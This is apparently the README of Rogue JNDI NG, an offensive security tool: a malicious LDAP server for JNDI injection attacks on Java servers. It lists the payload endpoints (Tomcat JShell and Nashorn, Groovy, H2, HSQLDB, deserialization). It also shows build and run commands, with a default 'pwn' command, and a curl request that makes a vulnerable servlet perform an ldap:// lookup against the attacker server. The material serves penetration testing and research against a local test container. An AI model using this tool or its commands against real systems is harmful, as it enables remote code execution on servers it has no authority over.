# ROGUE JNDI NG
<img src="resources/logo.webp" alt="A bug sitting on top of a Stormtrooper helmet" height="640" width="640" style="border-radius: 14%; overflow: hidden;">


A modern fork of [Rogue JNDI](https://github.com/artsploit/rogue-jndi), which is "a malicious LDAP server for JNDI injection attacks".

## Description
Rogue JNDI is a great tool in the realm of JNDI exploitation. Our fork adds many features in order to keep it relevant for modern Java environments.

You can read about the full extent of our improvements in our [blog post](https://mogwailabs.de/en/blog/2024/12/jndi-mind-tricks/), but here's a summary:
+ Support for Tomcat version >=10
+ Support for Java version >= 15
+ Users can provide whole script files instead of single OS commands
+ Endpoint for serving generic deserialization payloads
+ New endpoint for exploiting H2 
+ New endpoint for exploiting HSQLDB
+ The usage of [Testcontainers](https://github.com/testcontainers/testcontainers-java) for integration tests (also useful for manual testing, e.g. custom scripting payloads)

> [!NOTE]
> For a general overview, please refer to the original [README](https://github.com/artsploit/rogue-jndi/blob/master/README.md)

## Building
The project uses Maven and can be build with something like:
```shell
mvn clean package
```
This creates a `/target` folder where the `RogueJNDI-X.X.X.jar` file resides. 

## Usage
After building, you can run the following command to see all the options:
```
$ java -jar target/RogueJndi-1.1.jar -h
        __________ ________    ________ ____ ______________      ____._______  ________  .___   _______    ________ 
        \______   \\_____  \  /  _____/|    |   \_   _____/     |    |\      \ \______ \ |   |  \      \  /  _____/ 
         |       _/ /   |   \/   \  ___|    |   /|    __)_      |    |/   |   \ |    |  \|   |  /   |   \/   \  ___ 
         |    |   \/    |    \    \_\  \    |  / |        \ /\__|    /    |    \|    `   \   | /    |    \    \_\  \
         |____|_  /\_______  /\______  /______/ /_______  / \________\____|__  /_______  /___| \____|__  /\______  /
                \/         \/        \/                 \/                   \/        \/              \/        \/


Usage: java -jar target/RogueJndi-1.0.jar [options]
  Options:
    -c, --command          Command to execute on the target server (default: 
                           touch /usr/local/tomcat/temp/pwn.txt)
    -n, --hostname         Local HTTP server hostname (required for remote 
                           classloading and websphere payloads) (default: 
                           127.0.0.1) 
    -l, --ldapPort         Ldap bind port (default: 1389)
    -p, --httpPort         Http bind port (default: 8000)
    --wsdl                 [websphere1 payload option] WSDL file with XXE 
                           payload (default: /list.wsdl)
    --localjar             [websphere2 payload option] Local jar file to load 
                           (this file should be located on the remote server) 
                           (default: 
                           ../../../../../tmp/jar_cache7808167489549525095.tmp) 
    --h2                   [H2 database init script file (default: /h2)
    --js-payload-path      [Tomcat Nashorn payload option] Path to a .js file 
                           containing the payload served by the Tomcat 
                           controllers; overwrites the -c option (default: 
                           <empty string>)
    --jshell-payload-path  [Tomcat JShell payload option] Path to a .java file 
                           containing the payload served by the Tomcat 
                           controllers; overwrites the -c option (default: 
                           <empty string>)
    --groovy-payload-path  [Groovy payload option] Path to a .groovy file 
                           containing the payload served by the Groovy 
                           controller, overwrites the -c option (default: 
                           <empty string>)
    --generic-payload-path [Generic controller option] Path to a file 
                           containing a serialized object served by the 
                           Generic controller, overwrites the -c option 
                           (default: <empty string>)
    --jdbc-url             [HSQLDB controller option] JDBC URL pointing to an 
                           HSQL database (default: <empty string>)
    -h, --help             Show this help
```

## Example usage with custom JShell script
First, start the test container:
```shell
docker run -it -p 8080:8080 ghcr.io/mogwailabs/jndi-outcast/tomcat-10-jshell:latest
```

After cloning and building the project, start the server:
```shell
java -jar target/RogueJndi-1.1.jar --jshell-payload-path "/path/to/cloned/repo/rogue-jndi-ng/src/main/resources/payload.java"
```

Now you only need to make a request to the vulnerable servlet inside the container:

```shell
curl "http://localhost:8080/tomcat-10-jshell-1.0-SNAPSHOT/lookup?resource=ldap://host.docker.internal:1389/o=tomcat10-jshell"
```

## Demo
This demo uses our example JShell payload (`/src/main/resources/payload.java`):

https://github.com/user-attachments/assets/ca45c2e8-7aec-4530-bb47-db45306d6938


## Resources and Acknowledgements
+ Michael Stepankin for creating the original Rogue JNDI
+ His article about JNDI exploitation:
  https://www.veracode.com/blog/research/exploiting-jndi-injections-java
+ BlackHat talk of Alvaro Muñoz and Oleksandr Mirosh:
  https://www.youtube.com/watch?v=Y8a5nB-vy78
+ Their BlackHat paper:
  https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf
+ Article that includes a rough timeline of JDNI vulnerabilities by Moritz Bechler:
  https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection
+ Our previous article about Java 17 deserialization:
  https://mogwailabs.de/en/blog/2023/04/look-mama-no-templatesimpl
